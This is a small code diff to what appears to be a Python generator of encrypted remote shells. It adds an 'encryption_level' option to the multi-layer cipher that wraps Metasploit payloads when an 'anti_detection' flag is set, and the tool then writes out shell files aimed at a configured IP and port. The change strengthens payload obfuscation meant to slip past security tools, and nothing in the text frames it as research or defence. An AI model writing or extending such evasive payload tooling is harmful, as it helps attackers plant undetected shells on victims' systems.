@@ -36,6 +36,7 @@ def main():
             config = {
                 'ip': args.ip,
                 'port': args.port,
+                'encryption_level': args.encryption_level,
                 'retry': args.retry,
                 'delay': args.delay,
                 'key_length': args.key_length,
@@ -113,7 +114,7 @@ def main():
                     # 可选加密MSF载荷
                     if config['anti_detection']:
                         key = gene_advanced_key(config['key_length'])
-                        cipher = AdvancedCipher(key)
+                        cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
                         encrypted_code = cipher.multi_layer_encrypt(msf_wrapper_code)
                         
                         # 生成加密的MSF Shell文件
@@ -244,7 +245,7 @@ def main():
             
             key = gene_advanced_key(config['key_length'])
             
-            cipher = AdvancedCipher(key)
+            cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
             encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
             
             # 生成主Shell文件
@@ -299,7 +300,7 @@ def main():
             
             key = gene_advanced_key(config['key_length'])
             
-            cipher = AdvancedCipher(key)
+            cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
             encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
             
             # 生成Shell文件
